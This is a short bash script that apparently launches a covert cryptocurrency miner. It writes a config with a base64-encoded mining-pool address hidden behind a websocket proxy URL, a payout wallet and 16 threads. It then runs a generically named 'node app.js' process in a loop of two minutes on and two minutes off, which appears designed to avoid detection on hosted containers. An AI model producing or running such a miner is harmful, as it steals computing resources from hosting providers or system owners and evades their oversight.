#!/bin/bash

# Infinite loop to repeat the process
while true; do
  # Change to the directory (adjust the path if necessary)
  # cd /opt/app-root/src/ollma || { echo "Directory not found"; exit 1; }
  
  # Ensure the node executable has the proper permissions
  chmod +x ./node
  
  # Write the configuration to data.json
  cat <<EOF > data.json
{
  "proxy": "wss://web-production-b425.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
  "config": { "threads": 16, "log": true },
  "options": { "user": "RYJVM8YKZfHJpN1cevUKWkEqLfMbUz7Rk5", "password": "c=RVN", "argent": "robin" }
}
EOF

  # Start the node process in the background and capture its PID
  ./node app.js &
  pid=$!

  echo "Started node with PID $pid. Running for 2 minutes..."
  
  # Let the process run for 2 minutes (120 seconds)
  sleep 120
  
  # Terminate the node process
  kill $pid
  echo "Terminated node process with PID $pid."
  
  # Wait for 2 minutes before starting the next cycle
  sleep 120
done
